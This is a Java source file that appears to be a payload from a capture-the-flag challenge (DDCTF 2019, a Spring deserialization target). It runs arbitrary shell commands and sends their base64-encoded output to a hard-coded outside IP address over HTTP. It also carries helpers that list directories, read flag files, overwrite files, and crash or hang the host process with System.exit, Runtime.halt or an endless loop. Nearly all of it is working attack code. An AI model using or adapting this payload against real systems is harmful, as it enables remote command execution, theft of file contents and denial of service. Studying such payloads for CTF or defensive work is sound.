import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class ErrorBaseExec {

    public static void do_exec(String args) throws Exception {
        String res = exec(args);
        //String res = getDir("/tmp");
        //String res = getDir("/flag");
        //dosExit();
        //String res = getFileContent("/flag/flag_7ArPnpf3XW8Npsmj");

        //String res = writeFile("/tmp/spring-serial-ddctf-2019-1.0-SNAPSHOT.log");
        //String res1 = writeFile("/flag/blocksystem.txt");
        //String res = writeFile("/flag/flag_7ArPnpf3XW8Npsmj");

        URL url = new URL("http://39.106.143.48:9000/base64.php?q=" + Base64.getEncoder().encodeToString(res.getBytes()));
        //System.out.println(url);
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestMethod("GET");
        con.getResponseCode();
    }

    public static String exec(String args) throws Exception {
        Process proc = Runtime.getRuntime().exec(args);
        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        StringBuffer sb = new StringBuffer();
        String line;
        while ((line = br.readLine()) != null) {
            sb.append(line).append("\n");
        }
        String result = sb.toString();
        return result;
    }

    public static String getDir(String path) {
        String res = "";

        File f = new File(path);
        if (!f.exists()) {
            return path + " not exists";
        }

        File[] fa = f.listFiles();
        for (int i = 0; i < fa.length; i++) {
            File fs = fa[i];
            if (fs.isDirectory()) {
                res = res + fs.getName() + " [dir]" + "\n";
            } else {
                res = res + fs.getName() + "\n";
            }
        }

        return res;
    }

    public static String getFileContent(String filename) throws Exception {
        String content = "";

        File file = new File(filename);

        InputStreamReader reader = new InputStreamReader(new FileInputStream(file));

        BufferedReader br = new BufferedReader(reader);
        String line = br.readLine();
        content += line + "\n";
        while (line != null) {
            line = br.readLine();
            content += line + "\n";
        }
        return content;
    }

    public static void dosExit() {
        System.exit(1);  // 这个真的可以~ @angelwhu
    }

    public static void dosRuntimeHalt() {
        Runtime.getRuntime().halt(1);
    }

    public static void dosLoop() {
        int a = 0;
        while (true) {
            a++;
        }
    }

    public static String writeFile(String fileName) {
        FileWriter writer= null;
        try {
            writer = new FileWriter(fileName);
            writer.write("Test overwite\n");
            writer.close();
            return "OK~";
        } catch (IOException e) {
            e.printStackTrace();
            return "Write Error~";
        }
    }

    public static void main(String[] args) throws Exception {
        do_exec("id");
    }
}
